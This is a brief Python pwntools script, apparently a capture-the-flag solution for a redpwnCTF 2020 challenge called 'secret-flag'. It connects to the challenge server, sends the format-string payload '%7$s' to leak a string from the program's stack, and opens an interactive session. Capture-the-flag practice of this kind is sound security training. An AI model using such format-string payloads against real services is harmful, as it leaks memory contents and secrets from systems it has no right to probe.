from pwn import *
from binascii import *
b=ELF("./secret-flag")

leak=''
r=remote("2020.redpwnc.tf",31826)
#r=process("./secret-flag")
pay="%7$s"
r.recv()
r.sendline(pay)

r.interactive()


